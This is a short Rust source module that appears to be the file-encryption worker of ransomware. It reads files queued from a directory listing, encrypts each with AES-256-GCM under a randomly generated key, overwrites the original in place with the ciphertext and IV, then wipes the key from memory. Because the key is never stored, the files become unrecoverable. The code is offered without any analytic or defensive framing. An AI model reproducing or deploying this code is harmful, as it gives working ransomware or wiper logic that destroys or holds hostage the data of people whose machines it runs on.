use std::fs::DirEntry;
use std::fs::{read, write};

use crossbeam_channel::Receiver;
use openssl::rand::rand_bytes;
use openssl::symm::{encrypt, Cipher};
use tracing::{event, Level};
use zeroize::Zeroize;

pub(crate) fn generate_key() -> Vec<u8> {
    let mut key = vec![0 as u8; 32];
    rand_bytes(&mut key).unwrap();
    key
}

pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
    event!(Level::DEBUG, "Encryption worker started.");
    while r.len() != 0 {
        if let Ok(file) = r.recv() {
            event!(Level::DEBUG, "Processing file: {:?}", file);
            let content = read(file.path());
            if content.is_err() {
                continue;
            }
            let mut iv = generate_key();

            if let Ok(mut output) = encrypt(
                Cipher::aes_256_gcm(),
                &key,
                Some(&iv),
                &content.as_ref().unwrap(),
            ) {
                output.append(&mut iv);
                let _ = write(file.path(), &output);
                output.zeroize();
            }
            content.unwrap().zeroize();
        }
    }
    event!(
        Level::DEBUG,
        "Channel is empty, zeroing memory and killing worker."
    );
    key.zeroize();
}
